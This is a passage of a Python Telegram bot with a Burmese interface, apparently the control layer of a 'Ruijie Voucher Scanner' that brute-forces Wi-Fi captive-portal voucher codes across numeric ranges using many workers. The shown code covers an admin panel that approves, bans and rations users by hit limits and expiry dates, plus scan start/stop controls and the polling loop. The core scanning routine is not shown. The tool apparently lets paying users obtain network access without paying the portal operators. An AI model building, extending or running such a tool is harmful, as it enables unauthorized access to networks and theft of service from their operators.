                tg_edit(chat_id, msg_id, f"❌ User ID <code>{tid}</code> ၏ တောင်းဆိုမှုကို ပယ်ချလိုက်ပါပြီ။")
        else:
            tg_edit(chat_id, msg_id, "⚠️ ဤ User အချက်အလက် မရှိတော့ပါ။")
        return

    ok, err = check_access(uid)
    if not ok:
        tg_edit(chat_id, msg_id, err)
        return

    if data.startswith("admin:"):
        if not is_super_admin(uid):
            tg_edit(chat_id, msg_id, "🚫 အက်ဒမင် သာ အသုံးပြုနိုင်သည်။", kb_main(uid))
            return
        parts = data.split(":")
        sub = parts[1]

        if sub == "menu":
            tg_edit(chat_id, msg_id, "👑 <b>အက်ဒမင် ထိန်းချုပ်ခန်း (Admin Panel)</b>", kb_admin_main())

        elif sub == "userlist":
            if not users_db:
                body = "<i>User မရှိသေးပါ။</i>"
            else:
                rows = []
                for k2, v in users_db.items():
                    tag = "👑" if int(k2) in SUPER_ADMINS else ("✅" if v.get("approved") else "⏳")
                    if v.get("banned"): tag = "🚫"
                    name = v.get("username", "User")
                    rows.append([{"text": f"{tag} {name} ({k2})", "callback_data": f"admin:manage:{k2}"}])
                rows.append([{"text": "« အက်ဒမင် မီနူးသို့", "callback_data": "admin:menu"}])
                tg_edit(chat_id, msg_id, "👥 <b>User စာရင်း (စီမံရန် User ကို နှိပ်ပါ)</b>", {"inline_keyboard": rows})
                return

        elif sub == "pending":
            pendings = [k for k, v in users_db.items() if not v.get("approved") and not is_super_admin(k)]
            if not pendings:
                tg_edit(chat_id, msg_id, "⏳ အတည်ပြုရန် စောင့်ဆိုင်းနေသော User မရှိပါ။", kb_admin_main())
            else:
                rows = []
                for k2 in pendings:
                    v = users_db[k2]
                    rows.append([{"text": f"⏳ {v.get('username', 'User')} ({k2})", "callback_data": f"admin:manage:{k2}"}])
                rows.append([{"text": "« အက်ဒမင် မီနူးသို့", "callback_data": "admin:menu"}])
                tg_edit(chat_id, msg_id, "⏳ <b>အတည်ပြုရန် စောင့်ဆိုင်းဆဲ Users များ</b>", {"inline_keyboard": rows})
                return

        elif sub == "manage":
            tid = parts[2]
            v = users_db.get(tid)
            if not v:
                tg_edit(chat_id, msg_id, "❌ User မတွေ့ပါ။", kb_admin_main())
                return
            lim = v.get("hit_limit", 0)
            used = v.get("hit_used", 0)
            hl = f"{used}/{lim}" if lim else f"{used}/♾"
            access = fmt_remaining(v.get("expires_at", 0))
            status_str = "ပိတ်ထားသည်" if v.get("banned") else ("အတည်ပြုပြီး" if v.get("approved") else "စောင့်ဆိုင်းဆဲ")
            
            info_text = (
                f"👤 <b>User အသေးစိတ် အချက်အလက်</b>\n\n"
                f"  • အမည်      : <b>{v.get('username')}</b>\n"
                f"  • ID         : <code>{tid}</code>\n"
                f"  • အခြေအနေ  : <code>{status_str}</code>\n"
                f"  • Hit အသုံးပြုမှု: <code>{hl}</code>\n"
                f"  • သက်တမ်း    : <code>{access}</code>"
            )
            tg_edit(chat_id, msg_id, info_text, kb_user_control(tid))
            return

        elif sub == "toggleapp":
            tid = parts[2]
            if tid in users_db:
                curr = users_db[tid].get("approved", False)
                users_db[tid]["approved"] = not curr
                save_users()
                v = users_db[tid]
                lim = v.get("hit_limit", 0)
                used = v.get("hit_used", 0)
                hl = f"{used}/{lim}" if lim else f"{used}/♾"
                access = fmt_remaining(v.get("expires_at", 0))
                status_str = "ပိတ်ထားသည်" if v.get("banned") else ("အတည်ပြုပြီး" if v.get("approved") else "စောင့်ဆိုင်းဆဲ")
                info_text = (
                    f"👤 <b>User အသေးစိတ် အချက်အလက်</b>\n\n"
                    f"  • အမည်      : <b>{v.get('username')}</b>\n"
                    f"  • ID         : <code>{tid}</code>\n"
                    f"  • အခြေအနေ  : <code>{status_str}</code>\n"
                    f"  • Hit အသုံးပြုမှု: <code>{hl}</code>\n"
                    f"  • သက်တမ်း    : <code>{access}</code>"
                )
                tg_edit(chat_id, msg_id, info_text, kb_user_control(tid))
            return

        elif sub == "toggleban":
            tid = parts[2]
            if tid in users_db:
                curr = users_db[tid].get("banned", False)
                users_db[tid]["banned"] = not curr
                save_users()
                v = users_db[tid]
                lim = v.get("hit_limit", 0)
                used = v.get("hit_used", 0)
                hl = f"{used}/{lim}" if lim else f"{used}/♾"
                access = fmt_remaining(v.get("expires_at", 0))
                status_str = "ပိတ်ထားသည်" if v.get("banned") else ("အတည်ပြုပြီး" if v.get("approved") else "စောင့်ဆိုင်းဆဲ")
                info_text = (
                    f"👤 <b>User အသေးစိတ် အချက်အလက်</b>\n\n"
                    f"  • အမည်      : <b>{v.get('username')}</b>\n"
                    f"  • ID         : <code>{tid}</code>\n"
                    f"  • အခြေအနေ  : <code>{status_str}</code>\n"
                    f"  • Hit အသုံးပြုမှု: <code>{hl}</code>\n"
                    f"  • သက်တမ်း    : <code>{access}</code>"
                )
                tg_edit(chat_id, msg_id, info_text, kb_user_control(tid))
            return

        elif sub == "sethits":
            tid = parts[2]
            PENDING_INPUT[str(uid)] = f"sethits:{tid}"
            tg_edit(chat_id, msg_id, f"🎯 User ID <code>{tid}</code> အတွက် Hit Limit အသစ် ရိုက်ထည့်ပါ။")
            return

        elif sub == "setdays":
            tid = parts[2]
            PENDING_INPUT[str(uid)] = f"setdays:{tid}"
            tg_edit(chat_id, msg_id, f"⏰ User ID <code>{tid}</code> အတွက် ရက်ပေါင်း သက်တမ်း ရိုက်ထည့်ပါ။")
            return

        elif sub == "remove":
            tid = parts[2]
            if int(tid) in SUPER_ADMINS:
                tg_edit(chat_id, msg_id, "🚫 Super Admin ကို ဖျက်၍မရပါ။", kb_admin_main())
            else:
                users_db.pop(tid, None)
                save_users()
                tg_edit(chat_id, msg_id, f"✅ User ID <code>{tid}</code> ကို ဖျက်ပြီးပါပြီ။", kb_admin_main())
            return

        elif sub == "broadcast":
            PENDING_INPUT[str(uid)] = "admin_broadcast"
            tg_edit(chat_id, msg_id, "📣 ကြေညာချက် စာသားကို ရိုက်ထည့်ပါ။")
            return

        elif sub == "stopall":
            n = 0
            for ctx in SCAN_CONTEXTS.values():
                ctx.stop = True
                n += 1
            tg_edit(chat_id, msg_id, f"🛑 စကန် {n} ခုလုံးကို ရပ်လိုက်ပါပြီ။", kb_admin_main())
            return
        return

    if data.startswith("hitshow:"):
        parts = data.split(":")
        sub = parts[1]
        if sub == "clear":
            set_user(uid, hit_history=[], hit_used=0)
            tg_edit(chat_id, msg_id, "🗑 မှတ်တမ်းများကို ရှင်းလင်းပြီးပါပြီ။", kb_main(uid))
        elif sub == "page":
            p = int(parts[2])
            tg_edit(chat_id, msg_id, hitshow_text(uid, p), hitshow_kb(uid, p))
        return

    if data == "menu:main":
        tg_edit(chat_id, msg_id, "🇲🇲 <b>MK VOUCHER SCANNER v10.1</b>\n\n" + fmt_state(uid), kb_main(uid))
    elif data == "menu:mode":
        tg_edit(chat_id, msg_id, "📡 <b>စကန်မုဒ် ရွေးချယ်ပါ</b>", kb_mode())
    elif data == "menu:workers":
        PENDING_INPUT[str(uid)] = "workers"
        tg_edit(chat_id, msg_id, "⚙️ Workers အရေအတွက် ရိုက်ထည့်ပါ။ (ဥပမာ: 50)")
    elif data == "menu:url":
        PENDING_INPUT[str(uid)] = "url"
        tg_edit(chat_id, msg_id, "🔗 Session URL အသစ် ပို့ပါ။")
    elif data == "menu:status":
        tg_edit(chat_id, msg_id, fmt_state(uid), kb_main(uid))
    elif data == "menu:hitshow":
        tg_edit(chat_id, msg_id, hitshow_text(uid, 0), hitshow_kb(uid, 0))

    elif data.startswith("setmode:"):
        parts = data.split(":")
        m = parts[1]
        if m == "custom":
            PENDING_INPUT[str(uid)] = "custom_range"
            tg_edit(chat_id, msg_id, "✏️ Range ရိုက်ထည့်ပါ။ ဥပမာ: <code>100000 200000</code>")
        else:
            set_user(uid, mode=m, length=int(parts[2]))
            tg_edit(chat_id, msg_id, f"✅ မုဒ် သတ်မှတ်ပြီး: <b>{m}</b> ({parts[2]} လုံး)", kb_mode())

    elif data == "action:start":
        u = get_user(uid)
        lim = u.get("hit_limit", 0)
        used = u.get("hit_used", 0)
        if lim > 0 and used >= lim:
            tg_edit(chat_id, msg_id, f"🚫 <b>Hit Limit ပြည့်သွားပါပြီ။</b>\n\n🎯 သုံးပြီး: <code>{used}/{lim}</code>", kb_main(uid))
            return
        okk, info = start_scan(uid, chat_id)
        if not okk:
            tg_edit(chat_id, msg_id, info, kb_main(uid))
        else:
            tg_edit(chat_id, msg_id, "🚀 <b>စကန် စတင်လုပ်ဆောင်နေပါပြီ...</b>\n\n" + fmt_state(uid), kb_main(uid))

    elif data == "action:stop":
        ctx = SCAN_CONTEXTS.get(str(uid))
        if ctx:
            ctx.stop = True
            tg_edit(chat_id, msg_id, "⏹ <b>စကန် ရပ်ရန် အချက်ပြ ပို့ပြီးပါပြီ။</b>", kb_main(uid))
        else:
            tg_edit(chat_id, msg_id, "ℹ️ လက်ရှိ စကန် လုပ်ဆောင်နေခြင်း မရှိပါ။", kb_main(uid))


# ==================== POLLING LOOP ====================
def bot_polling_loop():
    global BOT_OFFSET
    for sid in SUPER_ADMINS:
        try:
            tg_send(sid, "🤖 <b>MK Voucher Scanner v10.1 Online</b>\n\n👑 အက်ဒမင် ထိန်းချုပ်ခန်းအတွက် /admin ကို နှိပ်ပါ။")
        except:
            pass

    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            r = requests.get(url, params={"offset": BOT_OFFSET + 1, "timeout": 25}, timeout=35)
            data = r.json()
            if not data.get("ok"):
                time.sleep(3)
                continue
            for upd in data.get("result", []):
                BOT_OFFSET = upd["update_id"]
                try:
                    if "message" in upd:
                        handle_message(upd["message"])
                    elif "callback_query" in upd:
                        handle_callback(upd["callback_query"])
                except Exception as e:
                    print(f"[!] handler error: {e}")
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(f"[!] polling error: {e}")
            time.sleep(3)


# ==================== MAIN ====================
def main():
    os.system("cls" if os.name == "nt" else "clear")
    load_users()
    print(f"\033[92m[+] Ruijie Voucher Scanner v10.1 Started Successfully!\033[0m")
    try:
        bot_polling_loop()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bot stopped by user.\033[0m")
        save_users()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        try: save_users()
        except: pass
        sys.exit(0)
